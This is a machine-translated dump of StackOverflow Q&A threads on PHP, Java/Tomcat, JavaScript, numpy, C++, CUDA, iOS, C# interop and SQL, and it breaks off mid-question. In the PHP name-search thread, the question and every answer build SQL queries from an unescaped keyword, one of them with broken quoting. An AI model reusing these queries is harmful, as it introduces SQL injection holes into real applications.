# StackOverflow 问答 15899000-15899999

# php - PHP锁定IP地址

> ID：15899000
> 
> 赞同：22
> 
> 时间：2013-04-09T10:03:13.123
> 
> 标签：php

我锁定了IP地址。

这是否意味着用户只能使用相同的IP地址登录？或者用户是否会注销并必须重新登录才能获得新会话？

```
if (isset($_SESSION['last_ip']) === false) {
    $_SESSION['last_ip'] = $_SERVER['REMOTE_ADDR']; 
}

if ($_SESSION['last_ip'] != $_SERVER['REMOTE_ADDR']){
    session_unset();
    session_destroy();  
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-09T10:04:45.943

如果用户的 IP 地址发生更改，此代码将删除会话（注销）。

因此，用户可以从任何 IP 地址登录，但如果它更改将被注销。

这可以防止会话劫持，但如果您使用动态 IP，则效果不佳，因为您的 IP 会不断变化。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-09T10:06:43.090

确实如此。如果用户的 IP 发生变化，他将被注销。虽然如果攻击者知道 IP，他仍然可以模仿它，但它并不完全安全。查看这些页面以获取有关如何防止会话劫持的更多信息：

*   [防止会话劫持的最佳方法是什么？](https://stackoverflow.com/questions/22880/what-is-the-best-way-to-prevent-session-hijacking)

*   [PHP中正确的会话劫持预防](https://stackoverflow.com/questions/8419332/proper-session-hijacking-prevention-in-php)

*   [PHP 会话固定/劫持](https://stackoverflow.com/questions/5081025/php-session-fixation-hijacking)

*   [停止会话劫持](https://stackoverflow.com/questions/9994008/stopping-session-hijacking)

我也强烈推荐 Chris Shiflett。他关于会话劫持的文章可以在这里找到：

[http://shiflett.org/articles/session-hijacking](http://shiflett.org/articles/session-hijacking)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-01-27T06:28:55.263

```
if (isset($_SESSION['last_ip']) === false) {
    $_SESSION['last_ip'] = $_SERVER['REMOTE_ADDR']; 
} 
```

上面的代码意味着如果会话“last_ip”尚未创建，它将被创建并存储用户当前 ip 的值。

```
if ($_SESSION['last_ip'] != $_SERVER['REMOTE_ADDR']){
    session_unset();
    session_destroy();  
} 
```

上面的代码表示如果“last_ip”的会话值不等于您当前的ip，它将释放所有会话变量（session_unset）并销毁所有注册到会话（session_destroy）的数据。

让我们描述一下真实的场景。

> 例如，我访问您的网站，因此第一个代码块存储了我当前的 ip。现在我的互联网断开了，我重新连接到我的 isp，它启用了 dhcp 并为我提供了新的 ip。因此，如果再次访问您的网站，第二个代码块会检查我是否拥有不同的 IP，以便将我注销。

还要编辑你的第二个代码块，这样如果会话“last_ip”还没有创建，它就不会抛出 php 通知。

```
if (isset($_SESSION['last_ip']) && $_SESSION['last_ip'] != $_SERVER['REMOTE_ADDR']){
    session_unset();
    session_destroy();  
} 
```

# java - HTTP 状态 500 - 对数据库的异常访问：连接池 - Servlet Tomcat - MySQL

> ID：15899005
> 
> 赞同：0
> 
> 时间：2013-04-09T10:03:22.327
> 
> 标签：java, mysql, xml, tomcat, connection-pooling

我正在尝试创建我的第一个连接池。我正在使用 Tomcat 7 和 MySQL DB 创建一个 Java Web 应用程序，并且我想创建一个可能实现连接池的 Servelet。我尝试了一个网络代码，但出现了一个持久的 HTTP 500 问题。我搜索了很多，但仍然没有解决方案，所以请不要链接其他讨论，因为我已经全部检查过了！这是我的代码：对于 context.xml ：

```
 <?xml version="1.0" encoding="UTF-8"?>
    <Context antiJARLocking="true" path="/My_First_WEB"
    reloadable="true" 
docBase="\My_First_WEB" >

<Resource
    name="jdbc/TutoPool"
    auth="Container"
    type="javax.sql.DataSource"/>

<ResourceParams name="jdbc/TutoPool">
    <parameter>
        <name>username</name>
        <value>root</value>
    </parameter>
    <parameter>
        <name>password</name>
        <value>""</value>
    </parameter>
    <parameter>
        <name>driverClassName</name>
        <value>com.mysql.jdbc.Driver</value>
    </parameter>
    <parameter>
        <name>url</name>
        <value>jdbc:mysql://localhost/TutoPool</value>
    </parameter>
                <parameter>
    <name>maxActive</name>
    <value>8</value>
</parameter>
<parameter>
    <name>maxIdle</name>
    <value>8</value>
</parameter>
<parameter>
    <name>maxWait</name>
    <value>10000</value>
</parameter>
<parameter>
    <name>validationQuery</name>
    <value>select 1</value>
</parameter>
<parameter>
    <name>removeAbandoned</name>
    <value>true</value>
</parameter>
<parameter>
    <name>removeAbandonedTimeout</name>
    <value>20</value>
</parameter>
<parameter>
    <name>logAbandoned</name>
    <value>true</value>
</parameter>
</ResourceParams>        
</Context> 
```

web.xml 如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee"              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
    <servlet>
    <servlet-name>TutoPool</servlet-name>
    <servlet-class>MyServelets.TutoPool</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>TutoPool</servlet-name>
    <url-pattern>/TutoPool</url-pattern>
</servlet-mapping>
<resource-ref>
    <description>
        reference a la ressource BDD pour le pool
    </description>
    <res-ref-name>jdbc/TutoPool</res-ref-name>
    <res-type>javax.sql.DataSource</res-type>
    <res-auth>Container</res-auth>
</resource-ref> 
<session-config>
    <session-timeout>
        30
    </session-timeout>
</session-config> 
```

最后 TutoPool.java 如下：

```
 package MyServelets;

 import java.io.*;
 import java.sql.*;
 import javax.naming.*;
 import javax.servlet.ServletException;
 import javax.servlet.UnavailableException;
 import javax.servlet.annotation.WebServlet;
 import javax.servlet.http.*;
 import javax.sql.DataSource;

 @WebServlet(name = "TutoPool", urlPatterns = {"/TutoPool"})
 public class TutoPool extends HttpServlet {
    private DataSource ds; //la source de données

/**
 * Processes requests for both HTTP
 * <code>GET</code> and
 * <code>POST</code> methods.
 *
 * @param request servlet request
 * @param response servlet response
 * @throws ServletException if a servlet-specific error occurs
 * @throws IOException if an I/O error occurs
 */
protected void processRequest(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    response.setContentType("text/html;charset=UTF-8");
    PrintWriter out = response.getWriter();
    try {
        /* TODO output your page here. You may use following sample code. */
        out.println("<html>");
        out.println("<head>");
        out.println("<title>Servlet TutoPool</title>");            
        out.println("</head>");
        out.println("<body>");
        out.println("<h1>Servlet TutoPool at " + request.getContextPath() + "</h1>");
        out.println("</body>");
        out.println("</html>");
    } finally {            
        out.close();
    }
}

// <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
/**
 * Handles the HTTP
 * <code>GET</code> method.
 *
 * @param request servlet request
 * @param response servlet response
 * @throws ServletException if a servlet-specific error occurs
 * @throws IOException if an I/O error occurs
 */
@Override
protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

    response.setContentType("text/html");
    PrintWriter out = response.getWriter();

    out.println("<html><head></head>");
    out.println("<body>");

    Connection con=null;
    Statement s=null;
    ResultSet rs=null;

    try {
        //récupération de la Connection depuis le DataSource
        con = ds.getConnection();
        s = con.createStatement();
        rs = s.executeQuery("SELECT * FROM table1");
        while (rs.next()) {
            out.println(rs.getString(1) + "      ");
            out.println(rs.getString(2) + "<br/>");
        }
    } catch (SQLException e) {
        response.sendError(500, "Exception sur l'accès à la BDD " + e);
    }finally {
        if (rs != null)
        {
            try {
                rs.close();
            } catch (SQLException e) {}
            rs = null;
        }
        if (s != null) {
            try {
                s.close();
            } catch (SQLException e) {}
            s = null;
        }
        if (con != null) {
            try {
                con.close();
            } catch (SQLException e) {}
            con = null;
        }
    }
    out.println("</body>");
    out.println("</html>");
    out.close();
}

/**
 * Returns a short description of the servlet.
 *
 * @return a String containing servlet description
 */
@Override
public String getServletInfo() {
    return "Short description";
}// </editor-fold>

/**
 *
 * @throws ServletException
 */
@Override
public void init() throws ServletException {
    try {
        //récupération de la source de donnée
        Context initCtx = new InitialContext();
        ds = (DataSource) initCtx.lookup("java:comp/env/jdbc/TutoPool");
    } catch (Exception e) {
        throw new UnavailableException(e.getMessage());
    }
} 
```

}

最后出现的错误是：

```
type Rapport d''état

message Exception sur l'accès à la BDD org.apache.tomcat.dbcp.dbcp.SQLNestedException:     Cannot create JDBC driver of class '' for connect URL 'null'

description Le serveur a rencontré une erreur interne (Exception sur l'accès à la BDD  org.apache.tomcat.dbcp.dbcp.SQLNestedException: Cannot create JDBC driver of class '' for  connect URL 'null') qui l'a empêché de satisfaire la requête. 
```

我已经检查了图书馆中的 mysql-connector，这应该可以工作！还是没有。请问，有人对此有想法吗？我在这里淹死了！！：（ 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:09:43.087

根据消息，连接池没有找到您的驱动程序类的名称，也没有找到您的数据库的 URL。所以我认为这是一个配置问题。

根据[Tomcat 7 文档](http://tomcat.apache.org/tomcat-7.0-doc/jndi-datasource-examples-howto.html)，您应该以这种方式配置连接池：

```
 <Resource name="jdbc/TestDB" auth="Container" type="javax.sql.DataSource"
           maxActive="100" maxIdle="30" maxWait="10000"
           username="root" password="" driverClassName="com.mysql.jdbc.Driver"
           url="jdbc:mysql://localhost/TutoPool"/> 
```

你也试过吗？

# javascript - 避免与函数命名约定 javascript 冲突

> ID：15899009
> 
> 赞同：1
> 
> 时间：2013-04-09T10:03:30.263
> 
> 标签：javascript

我的脚本中有一堆函数，它们位于 .js 文件中。如果其他人编写的其他脚本使用与我的脚本中相同的函数名称，如何避免与同一页面中的函数名称发生冲突？

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-09T10:05:29.040

如果您不需要在脚本之外访问这些函数，则可以将整个脚本包装在立即调用的函数表达式中：

```
(function () {
    // Your code here
}()); 
```

这引入了一个新的范围，因此其中的任何声明在其外部都是不可见的。

如果您确实需要在该范围之外进行访问，请将您的函数公开为“命名空间”的方法：

```
var YourStuff = (function () {
    // Private functions etc...

    // Expose public methods
    return {
        someMethod: function () {}
    };
}()); 
```

通过采用这种方法，您只需引入一个全局标识符，从而减少发生冲突的机会。您可以按如下方式调用该方法：

```
YourStuff.someMethod(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-09T10:05:29.243

使用命名空间..

```
var company = {};

company.doSomething = function() {
};

company.project = {};
company.project.submodule = {};
company.project.submodule.doSomething = function() {}; 
```

# python - python中3d数组的最大值

> ID：15899010
> 
> 赞同：6
> 
> 时间：2013-04-09T10:03:32.560
> 
> 标签：python, arrays, numpy, multidimensional-array

我想在 python 中找到 3d 数组的最大值。我试过

```
image_file1 = open("lena256x256.bmp","rb")
img_i = PIL.Image.open(image_file1)
pix = numpy.array(img_i);
maxval= max(pix) 
```

但我收到一个错误

```
 File "test.py", line 31, in <module>
    maxval= max(pix)
ValueError: The truth value of an array with more than one element is ambiguous. Use a.any() or a.all() 
```

我无法在这里发现我的错误，请帮助我。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-09T11:45:13.073

`max`您正在使用不理解多维 NumPy 数组的内置函数。您必须改为使用以下之一：

*   `pix.max()`
*   `numpy.max(pix)`
*   [`numpy.amax(pix)`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.amax.html)

在 1D NumPy 数组的情况下，这些也比内置更快。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-09T10:08:37.553

Max 期望单个值，错误消息应该很清楚，您想[`amax`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.amax.html)改用它。

```
maxval = numpy.amax(pix) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T11:55:05.293

根据 georgesl 写的内容，您可以使用 `flat`获取数组的迭代器，然后执行类似的操作

```
m = reduce(max, ar.flat) 
```

编辑：去掉`lambda`，默认`max`应该没问题。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2013-04-09T10:17:52.430

np.max 函数适用于向量，而不是矩阵（或沿轴）。要将最大元素设置为多维数组，您可以使用`flatten()`：`maxval= pp.max( pix.flatten() )`

# c++ - 在三级继承的情况下，dynamic_cast 会导致分段违规

> ID：15899013
> 
> 赞同：0
> 
> 时间：2013-04-09T10:03:37.093
> 
> 标签：c++, inheritance, dynamic-cast, polymorphism

在三级继承的情况下似乎`dynamic_cast`不起作用。

`print()`应用程序在方法调用点（in 中）崩溃并出现分段错误（核心转储`main()`）。

这是代码：

```
#include <iostream>
#include <typeinfo>     //must be included to call any member functions for the typeinfo object returned by typeid()
using namespace std;
class CBase
{
public:
    virtual void print()
    {
        cout<<"CBase::print"<<endl;
    }
    virtual ~CBase()
    { }
};
class CDerivedA : public CBase
{
public:
    virtual void print()
    {
        cout<<"CDerivedA::print"<<endl;
    }
    virtual ~CDerivedA()
    {}
};
class CDerivedB : public CDerivedA
{
public:
    void print()
    {
        cout<<"CDerivedB::print"<<endl;
    }
};
int main()
{
    CBase* ptrB = new CDerivedA();
    CDerivedB* ptrDB = dynamic_cast<CDerivedB*>(ptrB);
    ptrDB->print();
    return 1;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:30:52.287

# knockout.js - 选择带有 knockout.js 的选定选项

> ID：15899014
> 
> 赞同：0
> 
> 时间：2013-04-09T10:03:39.313
> 
> 标签：knockout.js

我有一个看起来像这样的组合框：

```
<selectdata-bind="options: adaptPoss, optionsText: 'description', click: function(data,event) {$parent.taskChanged(data,event)}">
    </select> 
```

现在我想跟踪选择了哪个元素（在 C# 中说“selectedIndexChanged”）如何在淘汰赛中调用该函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:19:52.080

您应该使用值绑定：

```
<select data-bind="options: adaptPoss, optionsText: 'description', value: selectedIndexChanged, click: function(data,event) {$parent.taskChanged(data,event)}">
    </select> 
```

在淘汰赛网站上阅读文档：http: [//knockoutjs.com/documentation/options-binding.html](http://knockoutjs.com/documentation/options-binding.html)

此外，您不需要如此复杂的点击处理程序，敲除会自动将对象发送`data`到`event`函数，因此您可以编写以下代码：

```
<select data-bind="options: adaptPoss, optionsText: 'description', value: selectedIndexChanged, click: $parent.taskChanged"> </select> 
```

# cuda - 访问 __device__ 函数模板的专门实例中的 CUDA 库函数

> ID：15899015
> 
> 赞同：0
> 
> 时间：2013-04-09T10:03:41.140
> 
> 标签：cuda, template-specialization

`__device__`我在 CUDA 中有以下模板函数：

```
template<typename T>
__device__ void MyatomicAdd(T *address, T val){
atomicAdd(address , val);
} 
```

如果将 T 实例化为浮点数，则编译和运行都很好，即

```
__global__ void myKernel(float *a, float b){
MyatomicAdd<float>(a,b);
} 
```

将毫无问题地运行。

我想专门研究这个函数，因为没有`atomicAdd()`双精度，所以我可以手动编写双精度实现。暂时忽略双精度特化，单精度特化和模板如下所示：

```
template<typename T>
__device__ void MyatomicAdd(T *address, T val){
};

template<>
__device__ void MyatomicAdd<float>(float *address, float val){
atomicAdd(address , val);
} 
```

现在编译器抱怨 atomicAdd() 在我的专业中未定义，当我尝试在专业中使用 __syncthreads() 之类的任何 CUDA 函数时同样适用。有任何想法吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-20T14:43:38.683

它最终成为与同事开发的一些 OpenGL 代码的链接问题。强制内联专业化解决了问题，尽管显然不是根本原因。不过，它现在会做，直到我可以费心去挖掘另一个人的代码。

# html - 响应式网站主题无法在 iPhone 上运行。

> ID：15899016
> 
> 赞同：0
> 
> 时间：2013-04-09T10:03:43.910
> 
> 标签：html, css

我目前正在编辑一个主题以响应我运行 Oxwall 的网站。主题的响应功能目前可以在我测试过的计算机浏览器上运行，但我可以让它在 iPhone 上运行。加载时，网站仍然保持宽大。

任何人都可以帮助我解决 CSS 的哪一部分似乎在 iphone 浏览器上占用了我的网站吗？

[http://omol.org](http://omol.org)

谢谢，杰米。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:07:49.993

添加：

```
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
```

了解原因：[https](https://developer.mozilla.org/en-US/docs/Mobile/Viewport_meta_tag) ://developer.mozilla.org/en-US/docs/Mobile/Viewport_meta_tag 。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:06:27.903

您似乎没有定义元视口标签。

这是一个示例，但显然您可以通过多种方式配置它们：

```
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
```

假设您在样式表中正确设置了媒体查询，那么添加元视口标签应该可以帮助您。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T11:30:04.193

您没有定义元视口标签。将此代码添加到文件的头部。

`<meta name="viewport" content="width=device-width, initial-scale=1.0">`

避免使用最大比例，因为它会阻止视障用户使用您的网站。

资料来源：[http ://a11yproject.com/posts/never-use-maximum-scale/](http://a11yproject.com/posts/never-use-maximum-scale/)

# objective-c - 在底部工具栏 Xcode 和 Objective C 中编辑项目

> ID：15899017
> 
> 赞同：0
> 
> 时间：2013-04-09T10:03:46.783
> 
> 标签：objective-c, xcode, uitableview, uinavigationcontroller

我有一个导航控制器。我想将编辑按钮放在工具栏的底部而不是顶部导航栏中。

```
 self.navigationItem.leftBarButtonItem = self.editButtonItem; 
```

我遇到的问题是，当我将编辑按钮添加到底部工具栏时。像这样：

```
 - (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
{
if (editingStyle == UITableViewCellEditingStyleDelete) {
    // Delete the row from the data source
    [self.christmasGifts removeGiftAtIndexPath:indexPath];
    [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationAutomatic];
}   
}

- (void)setEditing:(BOOL)editing animated:(BOOL)animated {

[super setEditing:editing animated:animated];
[self.tableView setEditing:editing animated:YES];

//Do not let the user add if the app is in edit mode.
if(editing)
    self.navigationItem.rightBarButtonItem.enabled = YES;
else
    self.navigationItem.rightBarButtonItem.enabled = YES;
 } 
```

然后链接编辑按钮 setEditing: 在工具栏中，它不会像顶部导航中的编辑按钮那样显示完成按钮。它只是保持不变。

但是您可以删除一个项目，但您不能使用底部按钮再次将状态重置为正常。

我需要能够从此导航控制器返回到前一个控制器。但是编辑按钮隐藏了后退按钮。

![在此处输入图像描述](https://i.stack.imgur.com/xPJpM.png) ![在此处输入图像描述](https://i.stack.imgur.com/xc0kZ.png) ![在此处输入图像描述](https://i.stack.imgur.com/bXYuu.png) ![在此处输入图像描述](https://i.stack.imgur.com/MEOFN.png)

编辑。

我知道我可以通过代码添加工具栏。

```
UIBarButtonItem *editButton = [[UIBarButtonItem alloc]
                           initWithTitle:@"Edit"
                           style:UIBarButtonItemStyleBordered
                           target:self
                           action:@selector(setEditing:)];

[[UIBarButtonItem appearance] setTintColor:[UIColor colorWithRed:70/255.0f green:155/255.0f blue:19/255.0f alpha:1.0]];

NSArray *arrBtns = [[NSArray alloc]initWithObjects:editButton,anotherButton, nil];
self.toolbarItems = arrBtns; 
```

和

```
[self.navigationController setToolbarHidden:NO]; 
```

甚至

```
 UIToolbar *toolBar=[[UIToolbar alloc]initWithFrame:CGRectMake(0, 500, 400, 40)];
  [self.tableView addSubview:toolBar]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:19:50.907

在您的`ViewController.h`, 声明（并将它们连接到`XIB`）

```
@property (strong, nonatomic) IBOutlet UIToolbar *toolbar;
@property (strong, nonatomic) IBOutlet UIBarButtonItem *toolbarbutton;

- (IBAction)toolbarbuttonTouched:(id)sender; // Connect with UIBarButtonItem in XIB 
```

在您的`ViewController.m`中，粘贴以下函数。

```
- (IBAction)toolbarbuttonTouched:(id)sender
{
    if ([self.toolbarbutton.title isEqualToString:@"Edit"])
    {
        [self.tableView setEditing:YES animated:YES];
        self.toolbarbutton.title = @"Done";
    }
    else
    {
        [self.tableView setEditing:NO animated:YES];
        self.toolbarbutton.title = @"Edit";
    }
} 
```

你们都准备好了。

**积分**

1.  您`UIBarButtonItem`的属性初始值`title`必须设置为“编辑”
2.  代码`editingStyle == UITableViewCellEditingStyleDelete`应该可以完美运行

# 编辑

**您不需要以下代码：**

`self.navigationItem.leftBarButtonItem = self.editButtonItem;`

```
- (void)setEditing:(BOOL)editing animated:(BOOL)animated {

[super setEditing:editing animated:animated];
[self.tableView setEditing:editing animated:YES];

//Do not let the user add if the app is in edit mode.
if(editing)
    self.navigationItem.rightBarButtonItem.enabled = YES;
else
    self.navigationItem.rightBarButtonItem.enabled = YES;
 } 
```

让我知道，它是否适合你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-26T06:07:06.830

[通过使用 UIViewController 的editButtonItem](https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIViewController_Class/index.html#//apple_ref/occ/instm/UIViewController/editButtonItem)方法，我能够更简单地做到这一点：

```
- (void)viewDidLoad {
    [super viewDidLoad];

    // Place table view Edit button in toolbar, after existing buttons.
    NSMutableArray *items = [self.toolbarItems mutableCopy];
    [items addObject:self.editButtonItem];
    [self setToolbarItems:items animated:YES];
} 
```

这将获取现有的工具栏按钮数组（如果有）并制作数组的可变副本，以便可以更改它。然后它将 UIViewController 的内置编辑按钮添加到工具栏。

结果是一个有效的编辑/完成工具栏按钮，可以打开和关闭编辑模式，而无需编写自己的操作方法来处理它。

# c# - 使用指向 C# 中的函数的指针作为参数调用 C++ 函数

> ID：15899018
> 
> 赞同：3
> 
> 时间：2013-04-09T10:03:58.690
> 
> 标签：c#, c++, function, pointers, marshalling

我在 Native C dll 中有以下代码。

```
typedef void CallbackType( INT32 param1, INT32 param2 );

NATIVE_API void RegisterEventCallBack(CallbackType *callBackFunction);

//INT32 is defined as below:

typedef signed int          INT32, *PINT32; 
```

我必须从我的 C# 代码中调用此方法。在遵循stackflow提供的一些解决方案之后，我尝试了这个：

**代表声明：**

```
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate void CallbackType(Int32 param1, Int32 param2); 
```

**方法导入声明：**

```
[DllImport("EtIPAdapter.dll")]
public static extern void RegisterEventCallBack([MarshalAs(UnmanagedType.FunctionPtr)]CallbackType callbackFunc); 
```

**来电：**

```
RegisterEventCallBack(ReceivedData);

private static void ReceivedData(Int32 param1, Int32 param2)
{
    //Do something
} 
```

但这不起作用，我收到以下错误：

> 对 PInvoke 函数“RegisterEventCallBack”的调用使堆栈失衡。这可能是因为托管 PInvoke 签名与非托管目标签名不匹配。检查 PInvoke 签名的调用约定和参数是否与目标非托管签名匹配。

我还尝试通过传递我使用的函数指针`GetFunctionPointerFromDelegate(ReceivedDataDelegate)`。但这也会导致同样的错误。

错误指出签名不匹配，但我没有看到任何明显的签名不匹配。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:24:10.837

请在执行 DLLImport 时检查调用约定 - 这默认为 Winapi / StdCall。
同样重要的是，在应用程序的生命周期内，您必须在托管代码中保留对委托的引用，否则垃圾收集器将在一段时间后删除您的委托，因为垃圾收集器只能计算托管代码内的引用。我通常保留对委托的引用作为设置委托的类的静态属性。

# php - 使用 concat 选择名字和姓氏搜索

> ID：15899020
> 
> 赞同：-3
> 
> 时间：2013-04-09T10:04:00.267
> 
> 标签：php, mysql

这是我的 sql 查询。我需要使用搜索来搜索名字和姓氏。

```
$result =  'SELECT * FROM resume 
            WHERE   (first_name LIKE "'.$sKeyword.'%" OR 
                     last_name LIKE "'.$sKeyword.'%" OR
                     CONCAT(first_name," ",last_name) like "'.$sKeyword.'%" OR 
                     email LIKE "'.$sKeyword.'%" OR 
                     phone LIKE "'.$sKeyword.'%" OR 
                     zip_code LIKE "'.$sKeyword.'%" OR 
                     find_us LIKE "'.$sKeyword.'%" )'; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:15:24.897

获取结果作为简单查询并使用连接显示结果...

```
$seresult='SELECT * FROM resume 
            WHERE   (first_name LIKE "%'.$sKeyword.'%" OR 
                     last_name LIKE "%'.$sKeyword.'%" OR
                     email LIKE "%'.$sKeyword.'%" OR 
                     phone LIKE "%'.$sKeyword.'%" OR 
                     zip_code LIKE "%'.$sKeyword.'%" OR 
                     find_us LIKE "%'.$sKeyword.'%" )'; 
```

在显示之后

```
<?= $seresult['first_name']; ?>-<?= $seresult['last_name']; ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:11:13.263

在运行查询之前，只需检查表中是否存在数据。

试试下面的方法：

```
$fullName = "john martin";
$nameArray = explode(" ",$fullName);
if(count($nameArray)>1)
  $search = " first_name in (".implode(',',$nameArray).") OR last_name in (".implode(',',$nameArray).")";
else
  $search = " first_name LIKE "%'.$sKeyword.'%" OR last_name LIKE "%'.$sKeyword.'%" OR"

$seresult='SELECT * FROM resume 
            WHERE   ('.$search.'
                     email LIKE "%'.$sKeyword.'%" OR 
                     phone LIKE "%'.$sKeyword.'%" OR 
                     zip_code LIKE "%'.$sKeyword.'%" OR 
                     find_us LIKE "%'.$sKeyword.'%" )'; 
```

**编辑**：根据您的评论更新了查询

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:33:47.340

将 OR 拆分为不同的 UNIONed 查询应该允许 MySQL 更有效地使用其索引。

我假设您正在寻找仅以输入的短语开头的项目。如果是这样，这可能会有所帮助，因为如果搜索短语中有空格，它只会对 first_name 和 last_name 进行组合搜索。

```
$result =  "SELECT * FROM resume 
            WHERE   first_name LIKE '$sKeyword%' 
            UNION
            SELECT * FROM resume 
            WHERE   last_name LIKE '$sKeyword%' 
            UNION
            SELECT * FROM resume 
            WHERE   email LIKE '$sKeyword%'
            UNION
            SELECT * FROM resume 
            WHERE   phone LIKE '$sKeyword%'
            UNION
            SELECT * FROM resume 
            WHERE   zip_code LIKE '$sKeyword%'
            UNION
            SELECT * FROM resume 
            WHERE   find_us LIKE '$sKeyword%'
            UNION
            SELECT * FROM resume 
            WHERE   CONCAT(first_name,' ',last_name) like '$sKeyword%'";

$sKeywordArray = explode(' ', $sKeyword);
IF (count($sKeywordArray) > 1)
{
    $result2 = array();     
    foreach($sKeywordArray $value)
    {
        $result2[] = "(first_name like '$value%' OR last_name like '$value%')";
    }
    $result .= " UNION SELECT * FROM resume WHERE ".implode(' AND ', $result2)
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:17:30.250

尝试这个

```
 $seresult='SELECT * FROM resume 
            WHERE   (first_name LIKE "%'.$sKeyword.'%" OR 
                             first_name LIKE "'.$sKeyword.'%" OR 
                             first_name LIKE "%'.$sKeyword.'" OR 
                            last_name LIKE "%'.$sKeyword.'%" OR
                            last_name LIKE "'.$sKeyword.'%" OR
                            last_name LIKE "%'.$sKeyword.'" OR
                            email LIKE "%'.$sKeyword.'%" OR 
                            phone LIKE "%'.$sKeyword.'%" OR 
                            zip_code LIKE "%'.$sKeyword.'%" OR 
                            find_us LIKE "%'.$sKeyword.'%" )'; 
```

# sql - SQL 列在同一张表中比较（自联接）

> ID：15899022
> 
> 赞同：0
> 
> 时间：2013-04-09T10:04:03.300
> 
> 标签：sql, join, self-join

我需要一个提示来解决这个 SQL（自连接）问题：

一个表，有列`value`和`category`

```
 id    ||  value || category || foo
------------------------------------
 1     ||  1     || a        || 1
 2     ||  2     || a        || 4
 3     ||  3     || a        || 2
 4     ||  0     || b        || 2
 5     ||  1     || b        || 1
 6     ||  2     || b        || 4
 7     ||  3     || b        || 2
 8     ||  4     || b        || 2
 9     ||  5     || b        || 1
10     ||  5     || b        || 4
11     ||  6     || b        || 2
12     || 99     || z        || 2 
```

我想比较 category 中`b`的所有值和 category中的所有值，`a`并获取所有 in`b`和 not in `a`or their 的值`id`，所以：

(0,1,2,3,4,5,5,6) “比较” (1,2,3) => (0,4,5,5,6)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:16:11.073

ANSI SQL：

```
SELECT
*
FROM
tbl
WHERE
category = 'b'
AND value NOT IN (SELECT value FROM tbl WHERE category = 'a') 
```

看到它住[在这里](http://www.sqlfiddle.com/#!2/9a6a7/1/0)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:16:33.827

开始分析您的任务：“获取 b 中而不是 a 或其 id 中的所有值”

1.  获取所有值 >`SELECT value FROM mytable`
2.  在 b >`WHERE category = 'b'`
3.  而不是在 >`AND value NOT IN (SELECT value FROM mytable WHERE category = 'a')`
4.  或他们的身份证 - 这应该是什么意思？

# c++ - 指针向量的奇怪行为

> ID：15899040
> 
> 赞同：-2
> 
> 时间：2013-04-09T10:04:42.973
> 
> 标签：c++, pointers, memory, vector

当我运行这段简单的代码时，我很难理解我得到的输出

```
#include <vector>
#include <iostream>
#include "LxUNIXsys.h"
using namespace std;

int main(int argc, char** argv) {

  //memory management class
  LxUNIXsys mem_manager;

  vector <double*> vec;

  mem_manager.DumpMemoryInfo();getchar();
  for(int i =0; i < 3; i++) vec.push_back(new double (3));
  for(int i =0; i < vec.size(); i++) cout << *vec[i] << endl;
  mem_manager.DumpMemoryInfo();getchar();
  for(int i =0; i < vec.size(); i++) delete vec[i];
  vec.clear();
  for(int i =0; i < 3; i++) cout << *vec[i] << endl;
  cout <<"size of vec " <<vec.size() << endl;
  mem_manager.DumpMemoryInfo();

  return 0;
} 
```

LxUNIXsys 是我用于内存转储的一个类，我从中调用的方法是：

```
void LxUNIXsys::DumpMemoryInfo() {

  pid_t id = getpid();
  //  cout << "id = " << id << endl;
  stringstream ss("");
  ss << "pmap -d " << id  << " | grep private ";
  //  cout << ss.str().c_str() << endl;
  cout << "Memory dump: [pid = " << id << " ] " << flush; system(ss.str().c_str());
} 
```

我得到的输出是：

```
Memory dump: [pid = 17012 ] mapped: 51476K    writeable/private: 7452K    shared: 0K

3
3
3
